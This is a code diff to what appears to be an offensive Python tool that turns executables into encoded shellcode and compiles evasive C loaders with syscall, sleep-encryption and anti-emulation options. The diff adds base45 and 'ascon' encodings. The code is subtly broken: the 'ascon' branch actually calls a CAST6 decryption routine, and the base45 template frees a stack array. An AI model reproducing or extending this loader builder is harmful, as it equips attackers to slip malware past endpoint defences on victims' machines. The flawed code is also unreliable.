@@ -141,6 +141,8 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
             cmd = ['python3', './encoders/bin2mac.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'ipv4':
             cmd = ['python3', './encoders/bin2ipv4.py', output_path_bin, '>', encoding_output_path]
+        elif encoding == 'base45':
+            cmd = ['python3', './encoders/bin2base45.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'base64':
             cmd = ['python3', './encoders/bin2base64.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'base58':
@@ -151,6 +153,8 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
             cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
         elif encoding == 'chacha':
             cmd = ['python3', './encoders/bin2chacha.py', output_path_bin, '>', encoding_output_path]
+        elif encoding == 'ascon':
+            cmd = ['python3', './encoders/bin2ascon.py', output_path_bin, '>', encoding_output_path]
         subprocess.run(' '.join(cmd), shell=True, check=True)
         output_path = encoding_output_path   
         print(f"[+] Shellcode encoded with {encoding} and saved to: {output_path}")
@@ -282,6 +286,8 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
             include_header = '#include "mac_converter.h"\n'
         elif encoding == 'ipv4':
             include_header = '#include "ipv4_converter.h"\n'
+        elif encoding == 'base45':
+            include_header = '#include "base45_converter.h"\n'
         elif encoding == 'base64':
             include_header = '#include "base64_converter.h"\n'
         elif encoding == 'base58':
@@ -292,6 +298,8 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
             include_header = '#include "aes2_converter.h"\n'
         elif encoding == 'chacha':
             include_header = '#include "chacha_converter.h"\n'
+        elif encoding == 'ascon':
+            include_header = '#include "ascon_converter.h"\n'
         else:
             # Default to uuid if not specified for backward compatibility
             include_header = '#include "uuid_converter.h"\n'
@@ -370,6 +378,20 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
         printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
         printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
         """
+        elif encoding == 'base45':
+            encoding_declaration_index = content.find('const char base45[]')
+            conversion_logic_template = """
+        DWORD decodedSize = CalculateBase45DecodedSize(base45);
+        unsigned char magiccode[decodedSize];
+        unsigned char* magiccodePtr = magiccode;
+        if (CustomBase45ToBinary(base45, strlen(base45), magiccodePtr, &decodedSize)) {
+            printf("Failed to decode base45 string\\n");
+            free(magiccode); 
+            return -2;
+        }
+        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
+        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
+        """
         elif encoding == 'base64':
             encoding_declaration_index = content.find('const char base64[]')
             conversion_logic_template = """
@@ -419,6 +441,18 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
     chacha20_encrypt(magiccode, magic_code, lenMagicCode, CHACHA20key, CHACHA20nonce, 1);
 
     // print_decrypted_result(magiccode, lenMagicCode);
+    printf("\\n");
+        """
+        elif encoding == 'ascon':
+            encoding_declaration_index = content.find('unsigned char magiccode[]')
+            conversion_logic_template = """
+    SIZE_T lenMagicCode = sizeof(magic_code);
+    unsigned char magiccode[lenMagicCode];
+
+    cast6_decrypt(magic_code, lenMagicCode, CAST6key, magiccode);
+
+    print_hex("magic code:", magiccode, lenMagicCode);
+
     printf("\\n");
         """
         elif encoding == 'aes2':
@@ -673,6 +707,8 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         compile_command.append('./converter/mac_converter.c')
     elif encoding == 'ipv4':
         compile_command.append('./converter/ipv4_converter.c')
+    elif encoding == 'base45':
+        compile_command.append('./converter/base45_converter.c')
     elif encoding == 'base64':
         compile_command.append('./converter/base64_converter.c')
     elif encoding == 'base58':
@@ -683,6 +719,8 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         compile_command.append('./converter/chacha_converter.c')
     elif encoding == 'aes2':
         compile_command.append('./converter/aes2_converter.c')
+    elif encoding == 'ascon':
+        compile_command.append('./converter/ascon_converter.c')
     if dream:
         compile_command.append('./evader/sleep_encrypt.c')
     if god_speed:
@@ -735,6 +773,8 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
             additional_sources.append('./converter/mac_converter.c')
         elif encoding == 'ipv4':
             additional_sources.append('./converter/ipv4_converter.c')  ### Add IPV6 converter in the future
+        elif encoding == 'base45':
+            additional_sources.append('./converter/base45_converter.c')
         elif encoding == 'base64':
             additional_sources.append('./converter/base64_converter.c')
         elif encoding == 'base58':
@@ -745,6 +785,8 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
             additional_sources.append('./converter/chacha_converter.c')
         elif encoding == 'aes2':
             additional_sources.append('./converter/aes2_converter.c')
+        elif encoding == 'ascon':
+            additional_sources.append('./converter/ascon_converter.c')
         elif encoding == 'rc4':
             additional_sources.append('./converter/rc4_converter.c')
     if dream:
@@ -977,7 +1019,7 @@ def main():
     parser.add_argument('-sgn', '--encode-sgn', action='store_true', help='Encode the generated shellcode using sgn tool.')
 
     ## TODO: Add support for other encoding types
-    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base64', 'base58', 'aes', 'chacha', 'aes2'], help='Encoding type: uuid, xor, mac, ip4, base64, base58 AES and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')
+    parser.add_argument('-e', '--encoding', choices=['uuid', 'xor', 'mac', 'ipv4', 'base45', 'base64', 'base58', 'aes', 'chacha', 'aes2', 'ascon'], help='Encoding type: uuid, xor, mac, ip4, base64, base58 AES and aes2. aes2 is a devide and conquer AES decryption to bypass logical path hijacking. Other encoders are under development. ')
 
 
     parser.add_argument('-c', '--compiler', default='mingw', choices=['mingw', 'pluto', 'akira'], help='Compiler choice: mingw (default), pluto, or akira')
